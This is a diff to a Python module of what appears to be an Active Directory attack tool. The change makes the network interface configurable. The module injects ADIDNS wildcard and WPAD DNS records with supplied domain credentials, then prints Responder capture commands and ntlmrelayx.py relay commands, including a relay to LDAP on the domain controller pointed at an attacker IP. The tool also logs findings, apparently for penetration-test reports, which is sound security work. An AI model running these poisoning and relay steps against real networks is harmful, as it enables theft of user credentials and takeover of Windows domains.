@@ -85,6 +85,7 @@ def run():
     user    = input_or_session("username", "Username")
     pw      = input_or_session("password", "Password")
     attacker = input_or_session("attacker_ip", "Attacker IP")
+    iface = SESSION.get("attacker_iface") or "<INTERFACE>"
 
     print(MENU)
     c = input(f"  {M}Choice:{RST} ").strip()
@@ -121,7 +122,7 @@ def run():
   # Should resolve to {attacker}
 
   {NEON_CYN}Start capture (after wildcard is in place):{RST}
-  sudo responder -I tun0 -A  # Passive — just capture, don't poison
+  sudo responder -I {iface} -A  # Passive — just capture, don't poison
   sudo {imp('ntlmrelayx.py')} -tf /tmp/targets.txt -smb2support
 """)
         add_finding("ADIDNS Wildcard Record Injected", "High",
@@ -149,7 +150,7 @@ def run():
         _run_dnstool(dc, dom, user, pw, "add", "wpad", attacker)
         print(f"""
   ── Step 2: Start Responder (WPAD + capture) ─────────────────────────────
-  sudo responder -I tun0 --wpad
+  sudo responder -I {iface} --wpad
 
   ── Step 3 (optional): Relay to LDAP ─────────────────────────────────────
   sudo {imp('ntlmrelayx.py')} -t ldap://{dc} -smb2support --wpad-host {attacker} \\
